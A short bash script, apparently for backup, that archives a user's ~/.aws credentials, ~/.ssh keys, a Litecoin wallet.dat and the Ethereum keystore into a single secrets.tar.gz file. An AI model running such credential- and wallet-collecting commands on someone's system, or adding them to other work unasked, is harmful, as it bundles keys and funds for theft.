#!/bin/bash
tar -cvz --exclude '.DS_Store' -f ./secrets.tar.gz -C ~ .aws .ssh Library/Application\ Support/Litecoin/wallet.dat Library/Ethereum/keystore
